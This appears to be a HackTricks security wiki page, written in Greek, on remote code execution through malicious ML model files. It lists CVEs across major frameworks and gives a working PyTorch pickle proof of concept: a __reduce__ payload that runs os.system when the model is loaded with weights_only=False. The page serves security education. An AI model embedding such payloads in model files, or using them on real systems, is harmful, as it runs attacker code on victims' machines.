# Models RCE

{{#include ../banners/hacktricks-training.md}}

## Loading models to RCE

Τα μοντέλα Μηχανικής Μάθησης συνήθως μοιράζονται σε διάφορες μορφές, όπως ONNX, TensorFlow, PyTorch, κ.λπ. Αυτά τα μοντέλα μπορούν να φορτωθούν σε μηχανές προγραμματιστών ή σε παραγωγικά συστήματα για να χρησιμοποιηθούν. Συνήθως, τα μοντέλα δεν θα πρέπει να περιέχουν κακόβουλο κώδικα, αλλά υπάρχουν περιπτώσεις όπου το μοντέλο μπορεί να χρησιμοποιηθεί για την εκτέλεση αυθαίρετου κώδικα στο σύστημα είτε ως προγραμματισμένη δυνατότητα είτε λόγω ευπάθειας στη βιβλιοθήκη φόρτωσης μοντέλων.

Κατά τη στιγμή της συγγραφής, αυτά είναι μερικά παραδείγματα αυτού του τύπου ευπαθειών:

| **Framework / Tool**        | **Vulnerability (CVE if available)**                                                    | **RCE Vector**                                                                                                                           | **References**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *Insecure deserialization in* `torch.load` **(CVE-2025-32434)**                                                              | Κακόβουλο pickle στο checkpoint του μοντέλου οδηγεί σε εκτέλεση κώδικα (παρακάμπτοντας την προστασία `weights_only`)                                        | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + κακόβουλη λήψη μοντέλου προκαλεί εκτέλεση κώδικα; RCE μέσω Java deserialization στο API διαχείρισης                                        | |
| **TensorFlow/Keras**        | **CVE-2021-37678** (unsafe YAML) <br> **CVE-2024-3660** (Keras Lambda)                                                      | Φόρτωση μοντέλου από YAML χρησιμοποιεί `yaml.unsafe_load` (εκτέλεση κώδικα) <br> Φόρτωση μοντέλου με **Lambda** layer εκτελεί αυθαίρετο Python κώδικα          | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (TFLite parsing)                                                                                          | Κατασκευασμένο μοντέλο `.tflite` προκαλεί υπερχείλιση ακέραιου → διαφθορά σωρού (πιθανή RCE)                                                      | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | Φόρτωση ενός μοντέλου μέσω `joblib.load` εκτελεί pickle με το payload `__reduce__` του επιτιθέμενου                                                   | |
| **NumPy** (Python)          | **CVE-2019-6446** (unsafe `np.load`) *disputed*                                                                              | `numpy.load` από προεπιλογή επιτρέπει pickled object arrays – κακόβουλο `.npy/.npz` προκαλεί εκτέλεση κώδικα                                            | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (dir traversal) <br> **CVE-2024-5187** (tar traversal)                                                    | Η διαδρομή εξωτερικών βαρών του μοντέλου ONNX μπορεί να ξεφύγει από τον κατάλογο (ανάγνωση αυθαίρετων αρχείων) <br> Κακόβουλο μοντέλο ONNX tar μπορεί να αντικαταστήσει αυθαίρετα αρχεία (οδηγώντας σε RCE) | |
| ONNX Runtime (design risk)  | *(No CVE)* ONNX custom ops / control flow                                                                                    | Το μοντέλο με προσαρμοσμένο τελεστή απαιτεί φόρτωση του εγχώριου κώδικα του επιτιθέμενου; πολύπλοκα γραφήματα μοντέλων εκμεταλλεύονται τη λογική για να εκτελέσουν μη προγραμματισμένους υπολογισμούς   | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (path traversal)                                                                                          | Η χρήση του API φόρτωσης μοντέλου με ενεργοποιημένο `--model-control` επιτρέπει σχετική διαδρομή για την εγγραφή αρχείων (π.χ., αντικατάσταση `.bashrc` για RCE)    | |
| **GGML (GGUF format)**      | **CVE-2024-25664 … 25668** (multiple heap overflows)                                                                         | Κακώς διαμορφωμένο αρχείο μοντέλου GGUF προκαλεί υπερχείλιση buffer σωρού στον αναλυτή, επιτρέποντας την εκτέλεση αυθαίρετου κώδικα στο σύστημα του θύματος                     | |
| **Keras (older formats)**   | *(No new CVE)* Legacy Keras H5 model                                                                                         | Κακόβουλο HDF5 (`.h5`) μοντέλο με κώδικα Lambda layer εκτελείται ακόμα κατά τη φόρτωση (η λειτουργία ασφαλείας Keras δεν καλύπτει την παλιά μορφή – “επίθεση υποβάθμισης”) | |
| **Others** (general)        | *Design flaw* – Pickle serialization                                                                                         | Πολλά εργαλεία ML (π.χ., μορφές μοντέλων βασισμένες σε pickle, Python `pickle.load`) θα εκτελέσουν αυθαίρετο κώδικα που είναι ενσωματωμένος σε αρχεία μοντέλων εκτός αν μετριαστεί | |

Επιπλέον, υπάρχουν κάποια μοντέλα βασισμένα σε python pickle, όπως αυτά που χρησιμοποιούνται από [PyTorch](https://github.com/pytorch/pytorch/security), που μπορούν να χρησιμοποιηθούν για την εκτέλεση αυθαίρετου κώδικα στο σύστημα αν δεν φορτωθούν με `weights_only=True`. Έτσι, οποιοδήποτε μοντέλο βασισμένο σε pickle μπορεί να είναι ιδιαίτερα ευάλωτο σε αυτού του τύπου επιθέσεις, ακόμη και αν δεν αναφέρονται στον πίνακα παραπάνω.

Παράδειγμα:

- Δημιουργήστε το μοντέλο:
```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
def __reduce__(self):
# This code will be executed when unpickled (e.g., on model.load_state_dict)
return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```
- Φορτώστε το μοντέλο:
```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
def __init__(self):
super().__init__()
self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```
{{#include ../banners/hacktricks-training.md}}
